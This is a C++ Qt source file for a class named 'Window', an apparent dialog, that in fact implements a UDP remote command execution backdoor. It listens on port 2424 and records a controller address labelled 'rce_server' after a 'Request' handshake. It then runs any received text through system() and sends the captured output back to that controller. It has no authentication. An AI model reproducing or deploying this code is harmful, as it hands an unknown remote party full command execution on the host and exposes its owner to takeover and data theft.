#include "window.h"

Window::Window(QWidget *parent): QDialog(parent)
{
    socket = new QUdpSocket(this);
    socket->bind(2424);
    connect(socket, SIGNAL(readyRead()), this, SLOT(Read()));
}

Window::~Window()
{

}

void Window::Send(QString message, QHostAddress address, int number)
{
    QByteArray datagram;
    QDataStream out(&datagram, QIODevice::WriteOnly);

    out << number << message;

    socket->writeDatagram(datagram, address, 2323);
}

void Window::Read()
{
    QByteArray datagram;
    QHostAddress address;

    do
        {
            datagram.resize(socket->pendingDatagramSize());
            socket->readDatagram(datagram.data(), datagram.size(), &address);

        }
    while(socket->hasPendingDatagrams());

    QString message;
    int number;

    QDataStream in(&datagram, QIODevice::ReadOnly);
    in.setVersion(QDataStream::Qt_5_7);
    in >> number >> message;

    if(!number && message == "Request")
    {
        Send("Reply", address, 0);
        rce_server = address;
    }

    else
    {
        #ifdef Q_WS_WIN
//            process->start("cmd /c " + message);
        #else
//                process->start(message);
                system(QString("(" + message + " ) > log").toStdString().c_str());
                StandartOutput();
        #endif
    }
}

void Window::StandartOutput()
{
    QFile file("log");
    file.open(QIODevice::ReadOnly);
    Send(file.readAll(), rce_server, 1);
    file.close();
}
